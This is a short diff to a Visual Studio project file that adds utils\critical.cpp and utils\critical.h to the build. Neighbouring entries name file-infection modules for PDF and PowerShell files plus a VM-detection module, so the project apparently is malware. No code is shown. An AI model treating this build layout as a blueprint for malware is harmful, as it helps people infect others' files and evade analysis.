@@ -229,6 +229,7 @@
     <ClCompile Include="utils\fileinfect\pdf.cpp" />
     <ClCompile Include="utils\fileinfect\powershell.cpp" />
     <ClCompile Include="utils\printer.cpp" />
+    <ClCompile Include="utils\critical.cpp" />
     <ClCompile Include="utils\reg.cpp" />
     <ClCompile Include="utils\tosse.cpp" />
     <ClCompile Include="utils\vmdetect.cpp" />
@@ -244,6 +245,7 @@
     <ClInclude Include="utils\colors.h" />
     <ClInclude Include="..\third_party\quicklz\quicklz.h" />
     <ClInclude Include="utils\bytebeats.h" />
+    <ClInclude Include="utils\critical.h" />
     <ClInclude Include="utils\reg.h" />
     <ClInclude Include="easter\dates.h" />
     <ClInclude Include="easter\desk.h" />
